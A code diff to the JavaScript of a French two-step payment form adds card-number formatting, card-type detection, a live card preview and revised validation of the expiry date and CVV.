@@ -9,6 +9,11 @@ const btnSubmit = document.getElementById('btn-submit');
 const successMessage = document.getElementById('success-message');
 const alertError = document.getElementById('alert-error');
 
+const cardNumberDisplay = document.getElementById('card-number-display');
+const cardHolderDisplay = document.getElementById('card-holder-display');
+const cardExpiryDisplay = document.getElementById('card-expiry-display');
+const cardTypeIcon = document.getElementById('card-type-icon');
+
 function showError(fieldId, message) {
   const input = document.getElementById(fieldId);
   const errorEl = document.getElementById(`error-${fieldId}`);
@@ -37,7 +42,7 @@ function validateStep1() {
   }
 
   if (!telephone || telephone.length < 8) {
-    showError('telephone', 'Veuillez entrer un numéro valide.');
+    showError('telephone', 'Veuillez entrer un numero valide.');
     valid = false;
   }
 
@@ -48,7 +53,7 @@ function validateStep2() {
   let valid = true;
   const rib = document.getElementById('rib').value.trim();
   const nomCompte = document.getElementById('nomCompte').value.trim();
-  const date = document.getElementById('date').value;
+  const date = document.getElementById('date').value.trim();
   const CVV = document.getElementById('CVV').value.trim();
 
   ['rib', 'nomCompte', 'date', 'CVV'].forEach(clearError);
@@ -56,7 +61,7 @@ function validateStep2() {
   const cardNumber = rib.replace(/\s/g, '');
 
   if (!/^\d{16}$/.test(cardNumber)) {
-    showError('rib', 'Veuillez entrer un numéro de carte de 16 chiffres.');
+    showError('rib', 'Le numero de carte doit contenir 16 chiffres.');
     valid = false;
   }
 
@@ -65,13 +70,13 @@ function validateStep2() {
     valid = false;
   }
 
-  if (!date) {
-    showError('date', 'Veuillez sélectionner une date.');
+  if (!/^\d{2}\/\d{2}$/.test(date)) {
+    showError('date', 'Format requis : MM/AA');
     valid = false;
   }
 
-  if (!/^\d{3}$/.test(CVV)) {
-    showError('CVV', 'Veuillez entrer un CVV valide (3 chiffres).');
+  if (!/^\d{3,4}$/.test(CVV)) {
+    showError('CVV', 'CVV invalide (3 ou 4 chiffres).');
     valid = false;
   }
 
@@ -87,6 +92,7 @@ function goToStep2() {
 
   const nom = document.getElementById('nom').value.trim();
   document.getElementById('nomCompte').value = nom;
+  cardHolderDisplay.textContent = nom.toUpperCase() || 'VOTRE NOM';
 }
 
 function goToStep1() {
@@ -96,6 +102,78 @@ function goToStep1() {
   indicator1.classList.remove('done');
   indicator1.classList.add('active');
 }
+
+function formatCardNumber(value) {
+  const digits = value.replace(/\D/g, '').substring(0, 16);
+  return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+}
+
+function getCardType(number) {
+  const digits = number.replace(/\D/g, '');
+  if (/^4/.test(digits)) return 'visa';
+  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'mastercard';
+  if (/^3[47]/.test(digits)) return 'amex';
+  if (/^6(?:011|5)/.test(digits)) return 'discover';
+  return '';
+}
+
+function updateCardTypeIcon(type) {
+  const icons = {
+    visa: 'VISA',
+    mastercard: 'MC',
+    amex: 'AMEX',
+    discover: 'DISC',
+  };
+  cardTypeIcon.textContent = icons[type] || '';
+  cardTypeIcon.style.fontSize = '0.7rem';
+  cardTypeIcon.style.fontWeight = '700';
+  cardTypeIcon.style.color = '#667eea';
+}
+
+function formatExpiry(value) {
+  const digits = value.replace(/\D/g, '').substring(0, 4);
+  if (digits.length >= 2) {
+    return digits.substring(0, 2) + '/' + digits.substring(2);
+  }
+  return digits;
+}
+
+// Card number input
+document.getElementById('rib').addEventListener('input', function (e) {
+  const raw = e.target.value.replace(/\D/g, '');
+  e.target.value = formatCardNumber(raw);
+
+  const display = formatCardNumber(raw).padEnd(19, '•').replace(/ /g, ' ');
+  cardNumberDisplay.textContent = display || '•••• •••• •••• ••••';
+
+  const type = getCardType(raw);
+  updateCardTypeIcon(type);
+
+  if (raw.length > 0) clearError('rib');
+});
+
+// Card holder input
+document.getElementById('nomCompte').addEventListener('input', function (e) {
+  cardHolderDisplay.textContent = e.target.value.toUpperCase() || 'VOTRE NOM';
+  if (e.target.value.trim()) clearError('nomCompte');
+});
+
+// Expiry input
+document.getElementById('date').addEventListener('input', function (e) {
+  e.target.value = formatExpiry(e.target.value);
+  cardExpiryDisplay.textContent = e.target.value || 'MM/AA';
+  if (e.target.value.trim()) clearError('date');
+});
+
+// CVV input
+document.getElementById('CVV').addEventListener('input', function (e) {
+  e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+  if (e.target.value) clearError('CVV');
+});
+
+// Clear errors on input
+document.getElementById('nom').addEventListener('input', () => clearError('nom'));
+document.getElementById('telephone').addEventListener('input', () => clearError('telephone'));
 
 btnContinue.addEventListener('click', () => {
   if (validateStep1()) goToStep2();
@@ -117,7 +195,7 @@ form.addEventListener('submit', async (e) => {
     telephone: document.getElementById('telephone').value.trim(),
     rib: document.getElementById('rib').value.trim().replace(/\s/g, ''),
     nomCompte: document.getElementById('nomCompte').value.trim(),
-    date: document.getElementById('date').value,
+    date: document.getElementById('date').value.trim(),
     CVV: document.getElementById('CVV').value.trim(),
   };
 
